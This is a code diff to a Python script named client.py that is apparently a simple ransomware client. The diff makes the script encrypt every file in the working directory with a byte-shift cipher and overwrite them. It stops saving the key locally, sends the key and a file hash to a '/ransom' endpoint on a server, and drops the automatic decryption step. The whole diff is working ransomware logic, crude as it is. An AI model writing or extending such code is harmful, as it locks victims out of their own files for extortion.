@@ -1,9 +1,10 @@
 import os
-# import requests
+import requests
 import shutil
 from hashlib import sha256
 from random import SystemRandom
 
+REQUEST_URL = 'http://localhost:5000/ransom?key={}&hash={}'
 
 def caesar_keygen():
     '''
@@ -23,6 +24,8 @@ def caesar_encrypt(key, filepath):
         while byte:
             ciphertext.append((ord(byte) + key) % 256)
             byte = f.read(1)
+    key = None
+    del key
     return bytearray(ciphertext)
 
 
@@ -56,24 +59,16 @@ def encrypt():
         ciphertext = caesar_encrypt(key, filepath)
         with open(filepath, 'wb') as f:
             f.write(ciphertext)
-    with open('key.txt', 'w') as f:
-        f.write(str(key))
-    with open('hash.txt', 'wb') as f:
-        f.write(digest.digest())
+    r = requests.get(REQUEST_URL.format(str(key), digest.hexdigest()))
+    print(r)
     key, digest = None, None
     del key, digest
 
 
-def decrypt():
+def decrypt(key, sha_hash):
     '''
     Run Caesar decryption of all files in this directory.
     '''
-    with open('key.txt', 'r') as k:
-        key = int(k.read())
-    with open('hash.txt', 'rb') as h:
-        sha_hash = h.read()
-    os.remove('key.txt')
-    os.remove('hash.txt')
     for filepath in os.listdir(os.getcwd()):
         if (filepath == 'client.py'):
             continue
@@ -86,10 +81,8 @@ def decrypt():
             continue
         with open(filepath, 'rb') as f:
             digest.update(f.read())
-    assert digest.digest() == sha_hash
+    assert digest.hexdigest() == sha_hash      # Not neccessary, used for testing
 
 if __name__ == '__main__':
-    # r = requests.get('http://localhost:5000/user/baoijsdf')
     encrypt()
-    decrypt()
     # print(r.text)
